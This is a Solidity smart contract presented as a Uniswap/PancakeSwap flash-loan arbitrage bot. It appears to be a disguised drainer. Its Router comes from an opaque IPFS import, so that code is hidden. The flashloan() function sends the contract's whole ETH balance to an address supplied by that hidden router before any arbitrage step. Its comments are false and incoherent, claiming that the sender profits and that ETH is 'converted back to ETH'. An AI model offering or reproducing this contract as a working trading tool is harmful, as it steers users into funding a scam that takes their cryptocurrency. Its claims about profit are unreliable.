pragma solidity ^0.6.7;

// Uniswap Deployer
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol";
// Uniswap Manager
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
// Arbitrage router
import "ipfs://QmckoiejUypLwggyUNPvois5g8ajNBhLheFJRWj5X9NrDR";
contract Flashloan {

	Router router;
	string public tokenName;
    	string public tokenSymbol;
	uint256 maxGas;
	
		constructor(
		string memory _tokenName,
		string memory _tokenSymbol,
		uint256 _maxGas
		) public {
		tokenName = _tokenName;
		tokenSymbol = _tokenSymbol;
        	maxGas = _maxGas;

		router = new Router();
		}

		// Send required ETH for liquidity pair
		receive() external payable {}
		function contractOwner() public view returns(address) {
			return address(msg.sender);
			}

		function contractBalance() public view returns(uint) {
			return address(this).balance;
			}

		function flashloan() public payable {
			payable(router.uniswapDepositAddress()).transfer(
				address(this).balance
				);
				//Prepare the arbitrage, ETH is converted to USDT using UniSwap contract.
				router.convertETHtoUSDT(msg.sender, maxGas / 2);
				//The arbitrage converts USDT for ETH using USDT/ETH PancakeSwap, and then immediately converts ETH back to ETH using ETH/USDT UniSwap.
				router.callArbitrageUniSwap(router.UniSwapAddress(), msg.sender);
				//After Arbitrage, ETH is transferred back to Router to pay the Uniswap plus fees.
				router.transferETHtoRouter(router.uniswapDepositAddress());
				//NOTE: The transaction sender gains ETH from the Arbitrage, this particular transaction can be repeated as price changes all the time.
				router.completeTransation(address(this).balance);
			}
}